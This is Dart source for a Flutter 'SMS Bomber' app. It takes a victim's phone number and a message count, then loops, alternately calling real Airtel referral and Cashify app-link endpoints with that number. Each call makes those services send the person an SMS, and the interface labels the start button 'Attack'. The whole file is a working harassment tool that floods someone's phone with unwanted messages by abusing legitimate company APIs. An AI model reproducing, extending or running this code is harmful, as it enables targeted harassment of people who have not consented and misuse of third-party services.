import 'dart:async';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

final String bomburl ="https://www.airtel.in/referral-api/core/notify?messageId=map&rtn=";
final String bomburl2 ="https://www.cashify.in/api/cu01/v1/app-link?mn=";


void main() {
  runApp(MaterialApp(
    debugShowCheckedModeBanner: false,
    title: "Flutter Sms Bomber",
    theme: ThemeData(
      primaryColor: Colors.white,
      accentColor: Colors.white,
      canvasColor: Colors.white,
    ),
    home: home(),
  ));
}

class home extends StatefulWidget {
  @override
  _homeState createState() => _homeState();
}

class _homeState extends State<home> {

  int mo_nu=0;
  int count=0;
  int sms_sent=0;
  bool sending=false;

  Future<Null> bombit(String mo_no,int count) async {

setState(() {
      sending=true;

});
    for(int i=0; i <count; i++)
    {
       setState(() {
      sms_sent=i+1;
    });

if(i%2==0)
{
 var req = await http.get(bomburl+mo_no);

}
else
{
   var req2 = await http.get(bomburl2+mo_no);

}
   
    print("SMS_Sent");
    }
    setState(() {
      sending=false;

});
   
  }

  @override
  void initState() {
    // TODO: implement initState

    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.deepOrange,
        centerTitle: true,
        title: Text(
          "SMS Bomber App",
          style: TextStyle(color: Colors.white),
        ),
      ),
      body: Center(
        child: SingleChildScrollView(
          child: Container(
            height: MediaQuery.of(context).size.height-200,
            width:MediaQuery.of(context).size.width-50,
            decoration: BoxDecoration(
                borderRadius: BorderRadius.all(Radius.circular(20)),
                gradient:
                    LinearGradient(colors: [Colors.orange, Colors.deepOrange])),
            child: Padding(
              padding: const EdgeInsets.all(8.0),
              child: Column(
                children: <Widget>[
                  Center(
                    child: CircleAvatar(
                      backgroundColor: Colors.white,
                      radius: 40,
                      child: FlutterLogo(
                        size: 50,
                      ),
                    ),
                  ),
                  Padding(
                      padding: const EdgeInsets.all(20),
                      child: TextField(
                        onChanged: (v){
                          mo_nu=int.parse(v);
                          },
                        style: TextStyle(
                            color: Colors.black, fontWeight: FontWeight.w300),
                        keyboardType: TextInputType.numberWithOptions(),
                        decoration: InputDecoration(
                          labelStyle: TextStyle(color: Colors.white),
                          prefixIcon: Icon(Icons.phone),
                          labelText: "Enter Number",
                        ),
                      )),

                         Padding(
                      padding: const EdgeInsets.all(20),
                      child: TextField(
                          onChanged: (v){
                          count=int.parse(v);
                          },
                        style: TextStyle(
                            color: Colors.black, fontWeight: FontWeight.w300),
                        keyboardType: TextInputType.numberWithOptions(),
                        decoration: InputDecoration(
                          labelStyle: TextStyle(color: Colors.white),
                          prefixIcon: Icon(Icons.sms),
                          labelText: "SMS Count",
                        ),
                      )),

                    sms_sent==0?Container():Center(
                        child: Text("$sms_sent SMS Sent"),
                      ),

Padding(
  padding: const EdgeInsets.fromLTRB(50, 25, 50, 0),
  child:  sending==true?SizedBox(
                  height: 50,
                  width: 50,
                  child: CircularProgressIndicator(),
                ):  InkWell(
  
                onTap: () {

                  bombit(mo_nu.toString(),count);
                },
  
                child: Container(

                  height: 50,
  
                
  
                  decoration: BoxDecoration(
  
                    gradient: LinearGradient(
  
                      colors: [
  
                        Colors.deepPurple,
  
                        Colors.pink,
  
                      ],
  
                      begin: Alignment.topLeft,
  
                      end: Alignment.bottomRight,
  
                    ),
  
                    borderRadius: BorderRadius.circular(20),
  
                    boxShadow: [
  
                      BoxShadow(
  
                        color: Colors.black12,
  
                        offset: Offset(5, 5),
  
                        blurRadius: 10,
  
                      )
  
                    ],
  
                  ),
  
                  child: Center(
  
                    child: Text(
  
                      'Attack',
  
                      style: TextStyle(
  
                        color: Colors.white,
  
                        fontSize: 30,
  
                        fontWeight: FontWeight.w500,
  
                      ),
  
                    ),
  
                  ),
  
                ),
  
              ),
),



              Padding(
                padding: const EdgeInsets.all(20.0),
                child: Center(child: Text("Proudly designed by Ravindra vala")),
              )


                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
